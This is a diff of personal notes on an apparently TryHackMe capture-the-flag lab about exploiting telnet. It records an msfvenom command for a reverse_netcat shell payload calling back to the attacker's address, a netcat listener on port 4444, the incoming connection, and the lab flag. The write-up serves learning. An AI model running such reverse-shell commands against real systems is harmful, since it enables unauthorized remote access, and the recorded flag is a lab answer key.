@@ -797,6 +797,11 @@ R = export the payload in raw format
 
 What word does the generated payload start with?
 sol. mkfifo
+##########################################################################################
+- here i gave this command on a new terminal
+[local tun0 ip] -> my ip address. i.e 10.9.0.151
+msfvenom -p cmd/unix/reverse_netcat lhost=10.9.0.151 lport=4444 R
+#########################################################################################
 terminal 3
 ┌──(kali㉿kali)-[~]
 └─$ msfvenom -p cmd/unix/reverse_netcat lhost=10.9.0.151 lport=4444 R
@@ -810,6 +815,7 @@ g. Perfect. We're nearly there. Now all we need to do is start a netcat listener
 "nc -lvp [listening port]"
 What would the command look like for the listening port we selected in our payload?
 sol. nc -lvp 4444
+
 terminal 3
 ┌──(kali㉿kali)-[~]
 └─$ nc -lvp 4444      
@@ -837,6 +843,7 @@ terminal 3
 listening on [any] 4444 ...
 10.10.197.106: inverse host lookup failed: Unknown host
 connect to [10.9.0.151] from (UNKNOWN) [10.10.197.106] 58564
+______________________________________________________________________________________________________________________________
 
 i. Success! What is the contents of flag.txt?
 sol. THM{y0u_g0t_th3_t3ln3t_fl4g}
@@ -852,3 +859,4 @@ flag.txt
 cat flag.txt
 THM{y0u_g0t_th3_t3ln3t_fl4g}
 
+TASK 8: 
